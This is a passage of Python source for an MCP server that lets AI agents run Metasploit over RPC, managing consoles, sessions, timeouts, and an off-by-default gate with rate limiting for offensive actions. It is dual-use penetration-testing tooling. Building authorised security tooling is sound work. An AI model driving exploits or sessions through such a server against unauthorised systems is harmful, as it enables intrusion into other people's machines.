# -*- coding: utf-8 -*-
import asyncio
import base64
import collections
import contextlib
import functools
import inspect
import ipaddress
import logging
import os
import pathlib
import re
import shlex
import socket
import psutil
import subprocess
import sys
import time
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple, Union

# ExceptionGroup is available in Python 3.11+ as BaseExceptionGroup
# For compatibility, we'll check for it
if sys.version_info >= (3, 11):
    # Python 3.11+ has BaseExceptionGroup built-in
    ExceptionGroup = BaseExceptionGroup  # type: ignore
else:
    # For older versions, try to import from exceptiongroup package
    try:
        from exceptiongroup import ExceptionGroup  # type: ignore
    except ImportError:
        # Fallback - shouldn't happen given our Python >= 3.10 requirement
        ExceptionGroup = Exception  # type: ignore

# --- Third-party Libraries ---
from fastmcp import FastMCP, Context

# Starlette imports for middleware
try:
    from starlette.middleware.base import BaseHTTPMiddleware
    from starlette.middleware import Middleware
    from starlette.types import ASGIApp, Message, Receive, Scope, Send

    STARLETTE_AVAILABLE = True
except ImportError:
    STARLETTE_AVAILABLE = False
    BaseHTTPMiddleware = None  # type: ignore
    Middleware = None  # type: ignore

if os.getenv("MSF_RPC_PROTOCOL", "msgpack").lower() == "jsonrpc":
    # Apply JSON-RPC monkeypatch BEFORE importing pymetasploit3 classes
    from . import jsonrpc_patch  # noqa: F401

    # Import pymetasploit3 modules
    import pymetasploit3.utils
    import pymetasploit3.msfrpc

    # Apply patch by passing the modules directly
    if jsonrpc_patch._is_jsonrpc_enabled():
        jsonrpc_patch.apply_patch(pymetasploit3.utils, pymetasploit3.msfrpc)

# Now import the classes - they will use the patched methods
from pymetasploit3.msfrpc import MsfConsole, MsfRpcClient, MsfRpcError

# --- Event Loop Monitoring ---
from .event_loop_monitor import (
    configure_event_loop_debugging,
    stop_event_loop_monitoring,
    get_monitoring_stats,
    check_event_loop_health,
)

# --- Custom Exceptions ---


class InvalidModuleError(ValueError):
    """
    Raised when a Metasploit module cannot be found or is invalid.

    This is a clean exception for expected "module not found" scenarios,
    avoiding noisy stack traces in logs for simple user input errors.
    """

    def __init__(self, module_type: str, module_name: str, message: str):
        self.module_type = module_type
        self.module_name = module_name
        super().__init__(message)


# --- Configuration & Constants ---

logging.basicConfig(
    level=os.environ.get("LOG_LEVEL", "INFO").upper(),
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger("metasploit_mcp_server")

# --- MCP Keep-Alive Progress Support ---
# Import keep-alive utilities from exploitmcp when available (used via gateway)
# Falls back to a no-op implementation when running standalone
try:
    from src.exploitmcp.core.keep_alive_progress import (
        KeepAliveProgressManager,
        DEFAULT_KEEPALIVE_INTERVAL,
    )

    KEEPALIVE_AVAILABLE = True
    logger.debug("KeepAliveProgressManager imported from exploitmcp")
except ImportError:
    KEEPALIVE_AVAILABLE = False
    DEFAULT_KEEPALIVE_INTERVAL = 10.0  # Default interval in seconds
    logger.debug("exploitmcp keep-alive not available, using no-op fallback")

    class KeepAliveProgressManager:
        """
        No-op fallback for when exploitmcp is not available.
        This allows MetasploitMCP to run standalone without keep-alive support.
        """

        def __init__(
            self,
            ctx,
            interval=10.0,
            operation_name="Operation",
            initial_progress=5,
            max_progress=90,
        ):
            self.ctx = ctx
            self.interval = interval
            self.operation_name = operation_name
            self.initial_progress = initial_progress
            self.max_progress = max_progress

        async def start(self):
            """No-op start."""
            pass

        async def stop(self, send_completion=True):
            """No-op stop."""
            pass

        async def __aenter__(self):
            """Context manager entry."""
            return self

        async def __aexit__(self, exc_type, exc_val, exc_tb):
            """Context manager exit."""
            pass


class _NoOpContextManager:
    """A no-op async context manager for when ctx is None."""

    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        pass

    async def start(self):
        pass

    async def stop(self, send_completion=True):
        pass


def get_keepalive_manager(
    ctx: Optional[Context],
    operation_name: str,
    interval: float = DEFAULT_KEEPALIVE_INTERVAL,
    initial_progress: int = 5,
    max_progress: int = 90,
):
    """
    Get a keep-alive manager for long-running operations.

    Returns a no-op context manager if ctx is None (for testing),
    otherwise returns a proper KeepAliveProgressManager.
    """
    if ctx is None:
        return _NoOpContextManager()
    return KeepAliveProgressManager(
        ctx,
        interval=interval,
        operation_name=operation_name,
        initial_progress=initial_progress,
        max_progress=max_progress,
    )


# Enable DEBUG logging for MCP streamable_http to diagnose SSE issues
# This will help us understand the request flow and identify race conditions
if os.environ.get("DEBUG_SSE", "false").lower() in ("true", "1", "yes"):
    logging.getLogger("mcp.server.streamable_http").setLevel(logging.DEBUG)
    logging.getLogger("mcp.server.streamable_http_manager").setLevel(logging.DEBUG)
    logging.getLogger("sse_starlette").setLevel(logging.DEBUG)
    logger.info("SSE debugging enabled - will log detailed request flow information")


# Configure logging for MCP server to handle SSE disconnection errors gracefully
# This is a known issue with Starlette middleware when clients disconnect during SSE streams
# The error "Unexpected message received: http.request" is non-critical and occurs during
# connection cleanup when clients disconnect unexpectedly. We add a custom filter to
# downgrade these specific errors to WARNING level to reduce noise in logs.
class SSEErrorFilter(logging.Filter):
    """Filter to downgrade non-critical SSE disconnection errors.

    This handles a known issue with Starlette middleware when clients disconnect
    unexpectedly during Server-Sent Events (SSE) streams. The error "Unexpected message
    received: http.request" occurs during connection cleanup and is non-critical.
    """

    def filter(self, record: logging.LogRecord) -> bool:
        # Check if this is the specific SSE disconnection error we want to handle
        if record.name == "mcp.server.streamable_http" and record.levelno == logging.ERROR:
            error_msg = str(record.getMessage())
            # Check exception info if available
            exception_msg = ""
            if record.exc_info and record.exc_info[1]:
                exception_msg = str(record.exc_info[1])

            # Check for the specific SSE disconnection error patterns
            if (
                "Unexpected message received: http.request" in error_msg
                or "Unexpected message received: http.request" in exception_msg
                or "SSE response error" in error_msg
            ):
                # Downgrade to WARNING level as this is expected during normal operation
                record.levelno = logging.WARNING
                record.levelname = "WARNING"
        return True


# Apply the filter to the MCP streamable_http logger
mcp_streamable_http_logger = logging.getLogger("mcp.server.streamable_http")
mcp_streamable_http_logger.addFilter(SSEErrorFilter())


# Add asyncio exception handler to catch unhandled SSE disconnection errors
# This is needed because the errors occur in TaskGroups and may not be properly caught
def _check_for_sse_error(exception: BaseException) -> bool:
    """Recursively check if an exception or ExceptionGroup contains an SSE disconnection error."""
    if isinstance(exception, RuntimeError):
        error_msg = str(exception)
        if "Unexpected message received: http.request" in error_msg:
            return True
    elif isinstance(exception, ExceptionGroup):
        # Recursively check all exceptions in the group
        for exc in exception.exceptions:
            if _check_for_sse_error(exc):
                return True
    return False


def handle_asyncio_exception(loop: asyncio.AbstractEventLoop, context: Dict[str, Any]) -> None:
    """Handle unhandled exceptions in asyncio event loop, specifically SSE disconnection errors.

    This handler catches RuntimeErrors about "Unexpected message received: http.request" which
    occur when clients disconnect unexpectedly during Server-Sent Events (SSE) streams. These
    errors are non-critical and should not break the connection.
    """
    exception = context.get("exception")
    message = context.get("message", "")

    # Check if this is the SSE disconnection error we want to handle gracefully
    if exception and _check_for_sse_error(exception):
        # This is a known non-critical SSE disconnection error
        # Log it as a warning instead of letting it propagate as an error
        logger.warning(
            f"SSE client disconnection detected (non-critical): {message}. "
            f"This occurs when clients disconnect unexpectedly during Server-Sent Events streams. "
            f"The connection will continue to function normally."
        )
        return

    # For all other exceptions, use the default handler behavior
    # But we'll log it at a more appropriate level
    if exception:
        logger.error(f"Unhandled exception in event loop: {message}", exc_info=exception)
    else:
        logger.error(f"Unhandled error in event loop: {message}")


session_shell_type: Dict[str, str] = {}

# Per-session locks to serialize concurrent access to the same Meterpreter/shell session.
# Keyed by session_id_str. Protected by _session_locks_guard for creation/deletion.
_session_locks: Dict[str, asyncio.Lock] = {}
_session_locks_guard = asyncio.Lock()
SESSION_LOCK_WAIT_TIMEOUT = 30  # seconds to wait for a busy session before giving up


async def _get_session_lock(session_id_str: str) -> asyncio.Lock:
    """Atomically get or create an asyncio.Lock for the given session ID."""
    async with _session_locks_guard:
        if session_id_str not in _session_locks:
            _session_locks[session_id_str] = asyncio.Lock()
        return _session_locks[session_id_str]


async def _cleanup_session_lock(session_id_str: str) -> None:
    """Remove the lock and mode tracking for a session that no longer exists."""
    session_shell_type.pop(session_id_str, None)
    async with _session_locks_guard:
        _session_locks.pop(session_id_str, None)


async def _list_sessions_str_keys(client: Any) -> Dict[str, Any]:
    """Return ``client.sessions.list`` with keys normalized to strings."""
    sessions_raw = await asyncio.to_thread(lambda: client.sessions.list)
    if not isinstance(sessions_raw, dict):
        raise MsfRpcError(f"Unexpected data type for sessions list: {type(sessions_raw).__name__}")
    return {str(k): v for k, v in sessions_raw.items()}


async def _get_session_object_from_map(
    client: Any,
    sessions_by_str_id: Dict[str, Any],
    session_id_str: str,
) -> Any:
    """Build a session object without relying on SessionManager.session().

    Some pymetasploit3 builds can raise KeyError for existing sessions because
    SessionManager.session() catches internal TypeError and re-raises KeyError.
    Constructing via _create_session against a normalized string-key map avoids
    that failure mode.
    """
    if session_id_str not in sessions_by_str_id:
        raise KeyError(f"Session ID ({session_id_str}) does not exist")

    try:
        return await asyncio.to_thread(lambda: client.sessions.session(session_id_str))
    except KeyError:
        session_info = sessions_by_str_id[session_id_str]
        create_fn = getattr(client.sessions, "_create_session", None)
        if callable(create_fn):
            return await asyncio.to_thread(
                lambda: create_fn(session_id_str, sessions_by_str_id, session_info)
            )
        raise


def _classify_payload_stage(payload_name: str) -> str:
    """Classify payload name as staged, stageless, or unknown from naming convention."""
    normalized = payload_name
    if normalized.startswith("payload/"):
        normalized = normalized[8:]
    parts = normalized.split("/")
    leaf = parts[-1]
    if "_" in leaf and ("meterpreter_" in leaf or "shell_" in leaf):
        return "stageless"
    if (
        len(parts) >= 2
        and parts[-2] in {"meterpreter", "shell"}
        and (leaf.startswith("reverse_") or leaf.startswith("bind_"))
    ):
        return "staged"
    return "unknown"


# Metasploit Connection Config (from environment variables)
MSF_PASSWORD = os.getenv("MSF_PASSWORD", "msf")
MSF_SERVER = os.getenv("MSF_SERVER", "127.0.0.1")
MSF_PORT_STR = os.getenv("MSF_PORT", "55553")
MSF_SSL_STR = os.getenv("MSF_SSL", "false")
PAYLOAD_SAVE_DIR = os.environ.get("PAYLOAD_SAVE_DIR", str(pathlib.Path.home() / "payloads"))

# Metasploit module documentation path (populated in Docker image via sparse checkout)
MSF_DOCS_PATH = os.environ.get("MSF_DOCS_PATH", "/opt/metasploit-docs/modules")

# Timeouts and Polling Intervals (in seconds)
DEFAULT_CONSOLE_READ_TIMEOUT = 15  # Default for quick console commands
LONG_CONSOLE_READ_TIMEOUT = 60  # For commands like run/exploit/check
SESSION_COMMAND_TIMEOUT = 60  # Default hard timeout for commands within sessions
SESSION_READ_INACTIVITY_TIMEOUT = 15  # Timeout if no data from session
DEFAULT_SESSION_INACTIVITY_TIMEOUT = 10  # Default inactivity wait for interactive session commands
EXPLOIT_SESSION_POLL_TIMEOUT = 120  # Max time to wait for session after exploit job
EXPLOIT_SESSION_POLL_INTERVAL = 3  # How often to check for session
UUID_MISSING_GRACE_POLLS = 3  # Consecutive missing polls before considering UUID lost
UUID_MISSING_GRACE_SECONDS = 6  # Minimum elapsed time before considering UUID lost
MODULE_RESULT_POLL_TIMEOUT = 300  # Max time to wait for auxiliary/post module completion
MODULE_RESULT_POLL_INTERVAL = 2  # How often to check module.running_stats
RPC_CALL_TIMEOUT = 25  # Default timeout for RPC calls like listing modules
MAX_TOOL_TIMEOUT_SECONDS = 120  # Maximum timeout allowed for tool parameters (cap at 120s)

# ---------------------------------------------------------------------------
# Safety controls (default-off dangerous actions + rate limiting)
#
# State-changing / offensive tools (exploit execution, payload delivery,
# session control, listener/job control) are treated as "dangerous actions"
# and are DISABLED by default. Operators opt in explicitly. This mirrors the
# default-safe posture of the official Rapid7 MCP server.
# ---------------------------------------------------------------------------


def _env_flag(name: str, default: bool = False) -> bool:
    return os.environ.get(name, str(default)).strip().lower() in ("1", "true", "yes", "on")


# Read from environment at import; can be overridden by configure_safety() (CLI).
DANGEROUS_ACTIONS_ENABLED = _env_flag("MSF_MCP_ALLOW_DANGEROUS", False)
try:
    RATE_LIMIT_PER_MIN = int(os.environ.get("MSF_MCP_RATE_LIMIT", "60") or 0)
except ValueError:
    RATE_LIMIT_PER_MIN = 60

_RATE_WINDOW_SECONDS = 60.0
_rate_events: "collections.deque[float]" = collections.deque()


def configure_safety(
    allow_dangerous: Optional[bool] = None, rate_limit_per_min: Optional[int] = None
) -> None:
    """Set the safety posture (called from the CLI in __init__.py)."""
    global DANGEROUS_ACTIONS_ENABLED, RATE_LIMIT_PER_MIN
    if allow_dangerous is not None:
        DANGEROUS_ACTIONS_ENABLED = allow_dangerous
    if rate_limit_per_min is not None:
        RATE_LIMIT_PER_MIN = rate_limit_per_min


def _rate_limit_retry_after() -> Optional[float]:
    """Return None if a request is allowed, else seconds until a slot frees up.

    Global sliding-window limiter. ``RATE_LIMIT_PER_MIN <= 0`` disables limiting.
    (Global rather than truly per-client: stdio has a single client, and the
    HTTP transport does not surface a stable per-caller identity here.)
    """
    limit = RATE_LIMIT_PER_MIN
    if not limit or limit <= 0:
        return None
    now = time.monotonic()
    while _rate_events and now - _rate_events[0] > _RATE_WINDOW_SECONDS:
        _rate_events.popleft()
    if len(_rate_events) >= limit:
        return round(_RATE_WINDOW_SECONDS - (now - _rate_events[0]), 1)
    _rate_events.append(now)
    return None


def dangerous_tool(func):
    """Decorator gating a state-changing tool behind the dangerous-actions flag
    and the rate limiter. Returns a structured error instead of running when
    blocked. Apply BELOW ``@annotated_tool`` so FastMCP still sees the real
    signature (``functools.wraps`` preserves it).
    """

    @functools.wraps(func)
    async def wrapper(*args, **kwargs):
        if not DANGEROUS_ACTIONS_ENABLED:
            return {
                "status": "error",
                "error": "dangerous_actions_disabled",
                "message": (
                    f"'{func.__name__}' performs a state-changing/offensive action and is "
                    "disabled by default. Enable it with the --allow-dangerous flag or "
                    "MSF_MCP_ALLOW_DANGEROUS=true."
                ),
            }
        retry_after = _rate_limit_retry_after()
        if retry_after is not None:
            return {
                "status": "error",
                "error": "rate_limited",
                "message": (
                    f"Rate limit of {RATE_LIMIT_PER_MIN} requests/min exceeded. "
                    f"Retry in ~{retry_after}s."
                ),
                "retry_after_seconds": retry_after,
            }
        return await func(*args, **kwargs)

    return wrapper


# Regular Expressions for Prompt Detection
MSF_PROMPT_RE = re.compile(
    rb"\x01\x02msf\d+\x01\x02 \x01\x02> \x01\x02"
)  # Matches the msf6 > prompt with control chars
SHELL_PROMPT_RE = re.compile(
    r"(?mi)^(?!\s*meterpreter\s*>\s*$)[^\n]*(?:[#$%]\s*|[^\s]>\s*)$"
)  # Match common shell prompts, but avoid meterpreter prompt and bare ">"
METERPRETER_PROMPT_RE = re.compile(r"meterpreter\s*>\s*$")
METERPRETER_ERROR_RE = re.compile(r"(?m)^\s*\[-\]\s+.+$")
MODULE_COMPLETE_RE = re.compile(rb".*module execution completed$", re.DOTALL | re.MULTILINE)

# Regular Expressions for Vulnerability Detection
IS_VULNERABLE_RE = re.compile(
    rb"(?:appears vulnerable|is vulnerable|appears to be vulnerable|\+ vulnerable)", re.IGNORECASE
)
IS_NOT_VULNERABLE_RE = re.compile(
    rb"(?:does not appear vulnerable|is not vulnerable|target is not vulnerable|check failed)",
    re.IGNORECASE,
)

# Regular Expression for Session Detection
SESSION_OPENED_RE = re.compile(
    rb"(?:meterpreter|command shell)\s+session\s+\d+\s+opened", re.IGNORECASE
)

# Regular Expression for Module Load Failure Detection
FAILED_TO_LOAD_MODULE_RE = re.compile(rb"\[-\]\s+Failed to load module:", re.IGNORECASE)

# Regular Expression for Module Check Not Supported Detection
CHECK_NOT_SUPPORTED_RE = re.compile(rb"This module does not support check", re.IGNORECASE)

# --- Metasploit Client Setup ---

_msf_client_instance: Optional[MsfRpcClient] = None

# Multi-agent support
_instance_manager: Optional["MetasploitInstanceManager"] = None
_multi_agent_enabled = os.getenv("METASPLOIT_MULTI_AGENT", "false").lower() in (
    "true",
    "1",
    "yes",
    "on",
)


def initialize_msf_client() -> MsfRpcClient:
    """
    Initializes the global Metasploit RPC client instance.
    Raises exceptions on failure.
    """
    global _msf_client_instance
    if _msf_client_instance is not None:
        return _msf_client_instance

    logger.info("Attempting to initialize Metasploit RPC client...")

    # Log RPC protocol being used
    rpc_protocol = os.getenv("MSF_RPC_PROTOCOL", "msgpack").lower()
    logger.info(f"Using RPC protocol: {rpc_protocol}")

    try:
        msf_port = int(MSF_PORT_STR)
        msf_ssl = MSF_SSL_STR.lower() == "true"
    except ValueError as e:
        logger.error(
            f"Invalid MSF connection parameters (PORT: {MSF_PORT_STR}, SSL: {MSF_SSL_STR}). Error: {e}"
        )
        raise ValueError("Invalid MSF connection parameters") from e

    try:
        logger.debug(
            f"Attempting to create MsfRpcClient connection to {MSF_SERVER}:{msf_port} (SSL: {msf_ssl}, Protocol: {rpc_protocol})..."
        )
        client = MsfRpcClient(password=MSF_PASSWORD, server=MSF_SERVER, port=msf_port, ssl=msf_ssl)
        # Test connection during initialization
        logger.debug("Testing connection with core.version call...")
        version_info = client.core.version
        msf_version = (
            version_info.get("version", "unknown") if isinstance(version_info, dict) else "unknown"
        )
        logger.info(
            f"Successfully connected to Metasploit RPC at {MSF_SERVER}:{msf_port} (SSL: {msf_ssl}), version: {msf_version}"
        )
        _msf_client_instance = client
        return _msf_client_instance
    except MsfRpcError as e:
        logger.error(
            f"Failed to connect or authenticate to Metasploit RPC ({MSF_SERVER}:{msf_port}, SSL: {msf_ssl}): {e}"
        )
        raise ConnectionError(f"Failed to connect/authenticate to Metasploit RPC: {e}") from e
    except Exception as e:
        logger.error(
            f"An unexpected error occurred during MSF client initialization: {e}", exc_info=True
        )
        raise RuntimeError(f"Unexpected error initializing MSF client: {e}") from e


def initialize_instance_manager():
    """Initialize the Metasploit Instance Manager for multi-agent support."""
    global _instance_manager

    if _instance_manager is not None:
        return _instance_manager

    if not _multi_agent_enabled:
        logger.info("Multi-agent support disabled for Metasploit")
        return None

    try:
        from .instance_manager import MetasploitInstanceManager

        base_port = int(os.getenv("METASPLOIT_PORT_START", "55553"))
        timeout = int(os.getenv("METASPLOIT_INSTANCE_TIMEOUT", "1800"))

        _instance_manager = MetasploitInstanceManager(
            base_port=base_port, password=MSF_PASSWORD, inactivity_timeout=timeout
        )

        logger.info(
            f"Metasploit Instance Manager initialized (base_port={base_port}, timeout={timeout}s)"
        )
        return _instance_manager

    except Exception as e:
        logger.error(f"Failed to initialize Metasploit Instance Manager: {e}", exc_info=True)
        return None


async def get_agent_msf_client(agent_id: str = "default-agent") -> MsfRpcClient:
    """
    Get Metasploit RPC client for a specific agent.

    If multi-agent mode is enabled, this will create an on-demand instance for the agent.
    Otherwise, it returns the global shared client.

    Args:
        agent_id: Agent identifier

    Returns:
        MsfRpcClient for this agent
    """
    if _multi_agent_enabled and _instance_manager:
        logger.debug(f"Getting per-agent Metasploit client for agent: {agent_id}")
        return await _instance_manager.get_client(agent_id)
    else:
        # Fall back to shared client
        logger.debug("Using shared Metasploit client (multi-agent disabled)")
        return get_msf_client()


def get_msf_client() -> MsfRpcClient:
    """Gets the initialized MSF client instance, raising an error if not ready."""
    if _msf_client_instance is None:
        logger.error("Metasploit client has not been initialized. Check MSF server connection.")
        raise ConnectionError(
            "Metasploit client has not been initialized."
        )  # Strict check preferred
    logger.debug("Retrieved MSF client instance successfully.")
    return _msf_client_instance


def cleanup_msf_client() -> None:
    """
    Clean up the global MSF client connection.

    This performs proper cleanup by:
    1. Calling auth.logout to properly close the RPC session on the server
    2. Clearing the global client reference

    This helps reduce TIME_WAIT connections by properly closing the session
    instead of just dropping the connection.
    """
    global _msf_client_instance

    if _msf_client_instance is None:
        logger.debug("No MSF client to cleanup")
        return

    try:
        logger.info("Cleaning up MSF RPC client connection...")

        # Call auth.logout to properly close the session on the server
        # This tells the server to clean up our authentication token
        try:
            token = getattr(_msf_client_instance, "token", None)
            if token:
                logger.debug(f"Calling auth.logout for global MSF client...")
                _msf_client_instance.call("auth.logout", [token])
                logger.info("MSF RPC session logged out successfully")
            else:
                logger.warning("No token found on MSF client, skipping logout")
        except Exception as e:
            # Log but don't fail - the connection may already be closed
            logger.warning(f"Error during MSF RPC logout: {e}")

        # Clear the global reference
        _msf_client_instance = None
        logger.info("MSF client cleanup complete")

    except Exception as e:
        logger.error(f"Error during MSF client cleanup: {e}", exc_info=True)


async def cleanup_msf_client_async() -> None:
    """
    Async version of cleanup_msf_client for use in async contexts.
    """
    global _msf_client_instance

    if _msf_client_instance is None:
        logger.debug("No MSF client to cleanup")
        return

    try:
        logger.info("Cleaning up MSF RPC client connection (async)...")

        # Call auth.logout to properly close the session on the server
        try:
            token = getattr(_msf_client_instance, "token", None)
            if token:
                logger.debug(f"Calling auth.logout for global MSF client...")
                await asyncio.to_thread(lambda: _msf_client_instance.call("auth.logout", [token]))
                logger.info("MSF RPC session logged out successfully")
            else:
                logger.warning("No token found on MSF client, skipping logout")
        except Exception as e:
            # Log but don't fail - the connection may already be closed
            logger.warning(f"Error during MSF RPC logout: {e}")

        # Clear the global reference
        _msf_client_instance = None
        logger.info("MSF client cleanup complete")

    except Exception as e:
        logger.error(f"Error during MSF client cleanup: {e}", exc_info=True)


async def cleanup_all_msf_resources() -> None:
    """
    Clean up all MSF resources including global client and instance manager.

    This should be called during server shutdown to properly close all
    RPC connections and prevent TIME_WAIT accumulation.
    """
    logger.info("Cleaning up all MSF resources...")

    # Clean up instance manager (if multi-agent mode is enabled)
    if _instance_manager is not None:
        try:
            await _instance_manager.shutdown()
            logger.info("Metasploit Instance Manager shutdown complete")
        except Exception as e:
            logger.error(f"Error shutting down Metasploit Instance Manager: {e}", exc_info=True)

    # Clean up global client
    await cleanup_msf_client_async()

    logger.info("All MSF resources cleanup complete")


async def check_msf_connection() -> Dict[str, Any]:
    """
    Check the current status of the Metasploit RPC connection.
    Returns connection status information for debugging.
    """
    try:
        client = get_msf_client()
        logger.debug(f"Testing MSF connection with {RPC_CALL_TIMEOUT}s timeout...")
        version_info = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.core.version), timeout=RPC_CALL_TIMEOUT
        )
        msf_version = (
            version_info.get("version", "N/A") if isinstance(version_info, dict) else "N/A"
        )
        return {
            "status": "connected",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "version": msf_version,
            "message": "Connection to Metasploit RPC is healthy",
        }
    except asyncio.TimeoutError:
        return {
            "status": "timeout",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "timeout_seconds": RPC_CALL_TIMEOUT,
            "message": f"Metasploit server not responding within {RPC_CALL_TIMEOUT}s timeout",
        }
    except ConnectionError as e:
        return {
            "status": "not_initialized",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "message": f"Metasploit client not initialized: {e}",
        }
    except MsfRpcError as e:
        return {
            "status": "rpc_error",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "message": f"Metasploit RPC error: {e}",
        }
    except Exception as e:
        return {
            "status": "error",
            "server": f"{MSF_SERVER}:{MSF_PORT_STR}",
            "ssl": MSF_SSL_STR,
            "message": f"Unexpected error: {e}",
        }


@contextlib.asynccontextmanager
async def get_msf_console() -> MsfConsole:
    """
    Async context manager for creating and reliably destroying an MSF console.
    """
    client = get_msf_client()  # Raises ConnectionError if not initialized
    console_object: Optional[MsfConsole] = None
    console_id_str: Optional[str] = None
    try:
        logger.debug("Creating temporary MSF console...")
        # Create console object directly
        console_object = await asyncio.to_thread(lambda: client.consoles.console())

        # Get ID using .cid attribute
        if hasattr(console_object, "cid"):
            console_id_val = getattr(console_object, "cid")
            console_id_str = str(console_id_val) if console_id_val is not None else None
            if not console_id_str:
                raise ValueError("Console object created, but .cid attribute is empty or None.")
            logger.info(f"MSF console created (ID: {console_id_str})")

            # Read initial prompt/banner to clear buffer and ensure readiness
            await asyncio.sleep(0.2)  # Short delay for prompt to appear
            initial_read = await asyncio.to_thread(lambda: console_object.read())
            logger.debug(f"Initial console read (clearing buffer): {initial_read}")
            yield console_object  # Yield the ready console object
        else:
            # This case should ideally not happen if .console() works as expected
            logger.error(
                f"client.consoles.console() did not return expected MsfConsole object with .cid. Got type: {type(console_object)}"
            )
            raise MsfRpcError(f"Unexpected result from console creation: {console_object}")

    except MsfRpcError as e:
        logger.error(f"MsfRpcError during console operation: {e}")
        raise MsfRpcError(f"Error creating/accessing MSF console: {e}") from e
    except Exception as e:
        logger.exception("Unexpected error during console creation/setup")
        raise RuntimeError(f"Unexpected error during console operation: {e}") from e
    finally:
        # Destruction Logic
        if console_id_str and _msf_client_instance:  # Check client still exists
            try:
                logger.info(f"Attempting to destroy Metasploit console (ID: {console_id_str})...")
                # Use lambda to avoid potential issues with capture
                destroy_result = await asyncio.to_thread(
                    lambda cid=console_id_str: _msf_client_instance.consoles.destroy(cid)
                )
                logger.debug(f"Console destroy result: {destroy_result}")
            except Exception as e:
                # Log error but don't raise exception during cleanup
                logger.error(f"Error destroying MSF console {console_id_str}: {e}")
        elif console_object and not console_id_str:
            logger.warning(
                "Console object created but no valid ID obtained, cannot explicitly destroy."
            )
        # else: logger.debug("No console ID obtained, skipping destruction.")


async def run_command_safely(
    console: MsfConsole,
    cmd: str,
    execution_timeout: Optional[int] = None,
    inactivity_timeout: Optional[int] = None,
    exit_terms_regexes: Optional[List[re.Pattern]] = None,
) -> str:
    """
    Safely run a command on a Metasploit console and return the output.
    Relies primarily on detecting the MSF prompt for command completion.

    Args:
        console: The Metasploit console object (MsfConsole).
        cmd: The command to run.
        execution_timeout: Optional specific timeout for this command's execution phase.
        inactivity_timeout: Optional no-output timeout before considering command complete.
        exit_terms_regexes: Optional list of compiled regex patterns. If provided, after a short
                           idle period, the output will be checked against these patterns. If any
                           match, the function will return early.

    Returns:
        The command output as a string.
    """
    if not (hasattr(console, "write") and hasattr(console, "read")):
        logger.error(f"Console object {type(console)} lacks required methods (write, read).")
        raise TypeError("Unsupported console object type for command execution.")

    try:
        logger.debug(f"Running console command: {cmd}")
        write_start_time = asyncio.get_event_loop().time()
        await asyncio.to_thread(lambda: console.write(cmd + "\n"))
        write_duration = asyncio.get_event_loop().time() - write_start_time
        logger.debug(f"Console write completed for '{cmd}' in {write_duration:.3f}s")

        # For "set" commands, don't wait for console output as they produce none
        if cmd.strip().startswith("set ") or cmd.strip().startswith("use "):
            logger.debug(f"Skipping console output wait for 'set' command: {cmd}")
            return ""

        output_buffer = b""  # Read as bytes to handle potential encoding issues and prompt matching
        start_time = asyncio.get_event_loop().time()

        # Determine overall timeout and inactivity timeout independently.
        read_timeout = execution_timeout or (
            LONG_CONSOLE_READ_TIMEOUT
            if cmd.strip().startswith(("run", "exploit", "check"))
            else DEFAULT_CONSOLE_READ_TIMEOUT
        )
        read_inactivity_timeout = inactivity_timeout or read_timeout
        check_interval = 0.1  # Seconds between reads
        last_data_time = start_time

        # Exit terms checking: short idle period before checking for exit terms
        exit_terms_idle_timeout = 2.0  # Wait 2 seconds of inactivity before checking exit terms
        exit_terms_checked = False  # Track if we've already checked and matched exit terms

        # Progress tracking for long-running commands
        progress_interval = 10  # Log progress every 10 seconds
        last_progress_time = start_time
        total_chunks_read = 0
        total_bytes_read = 0
        timed_out = False  # Track if we exit due to timeout

        logger.info(
            f"Starting console command execution: '{cmd}' (timeout: {read_timeout}s, inactivity: {read_inactivity_timeout}s)"
            f"{', with exit terms checking' if exit_terms_regexes else ''}"
        )

        while True:
            await asyncio.sleep(check_interval)
            current_time = asyncio.get_event_loop().time()
            elapsed_time = current_time - start_time

            # Progress logging for long-running operations
            if (current_time - last_progress_time) >= progress_interval:
                logger.info(
                    f"Console command '{cmd}' still running... "
                    f"Elapsed: {elapsed_time:.1f}s/{read_timeout}s, "
                    f"Chunks read: {total_chunks_read}, "
                    f"Bytes received: {total_bytes_read}, "
                    f"Last activity: {current_time - last_data_time:.1f}s ago"
                )
                last_progress_time = current_time

            # Check overall timeout first
            if elapsed_time > read_timeout:
                logger.warning(
                    f"Overall timeout ({read_timeout}s) reached for console command '{cmd}'. "
                    f"Total chunks: {total_chunks_read}, bytes: {total_bytes_read}"
                )
                timed_out = True
                break

            # Read available data
            try:
                chunk_result = await asyncio.to_thread(lambda: console.read())
                # console.read() returns {'data': '...', 'prompt': '...', 'busy': bool}
                chunk_data = chunk_result.get("data", "").encode(
                    "utf-8", errors="replace"
                )  # Ensure bytes
                is_busy = chunk_result.get("busy", False)

                # Handle the prompt - ensure it's bytes for pattern matching
                prompt_str = chunk_result.get("prompt", "")
                prompt_bytes = (
                    prompt_str.encode("utf-8", errors="replace")
                    if isinstance(prompt_str, str)
                    else prompt_str
                )

                # Enhanced debug logging for timeout analysis
                if chunk_data or is_busy or prompt_str:
                    logger.debug(
                        f"Console read result for '{cmd}' at {elapsed_time:.1f}s: "
                        f"data_len={len(chunk_data)}, busy={is_busy}, prompt='{prompt_str[:50]}...' if len(prompt_str) > 50 else prompt_str"
                    )

                # Log console busy state periodically
                if is_busy and (current_time - last_progress_time) >= (progress_interval - 1):
                    logger.debug(
                        f"Console reports busy=True for command '{cmd}' at {elapsed_time:.1f}s"
                    )

            except Exception as read_err:
                logger.warning(
                    f"Error reading from console during command '{cmd}' at {elapsed_time:.1f}s: {read_err}"
                )
                await asyncio.sleep(0.5)  # Wait a bit before retrying or timing out
                continue

            if chunk_data:
                chunk_size = len(chunk_data)
                total_chunks_read += 1
                total_bytes_read += chunk_size

                # Log first data received
                if total_chunks_read == 1:
                    logger.debug(
                        f"First data received for '{cmd}' after {elapsed_time:.3f}s: {chunk_size} bytes"
                    )

                # Log significant data chunks
                if chunk_size > 100:
